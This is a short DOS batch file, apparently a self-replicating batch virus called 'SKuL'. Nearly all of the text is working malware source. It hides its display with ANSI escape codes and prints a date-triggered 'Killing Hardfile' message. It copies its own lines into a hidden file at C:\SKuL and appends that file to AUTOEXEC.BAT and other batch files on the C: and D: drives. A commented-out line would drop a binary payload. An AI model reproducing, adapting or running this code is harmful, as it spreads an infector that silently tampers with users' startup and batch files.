::[8mSKuL
@echo off%[SKuL]%
echo.|date|find "20">nul%[SKuL]%
if errorlevel 1 goto SKuL1
echo SKuL Killing Hardfile...
::echo °¹  ™Í&Í>SKuL.com
::SKuL
:SKuL1 [6A
if exist C:\SKuL goto SKuL2
if not exist %0.bat goto SKuL
find "SKuL"<%0.bat>C:\SKuL
attrib C:\SKuL +h
:SKuL2 [5A
set SKuL=C:\AUTOEXEC.BAT
for %%f in (D:*.bat C:*.bat ..\*.bat) do set SKuL=%%f
if not exist %SKuL% goto SKuL
find /i "SKuL"<%SKuL%>nul
if errorlevel 1 type C:\SKuL>>%SKuL%
set SKuL=
:SKuL [7A[0m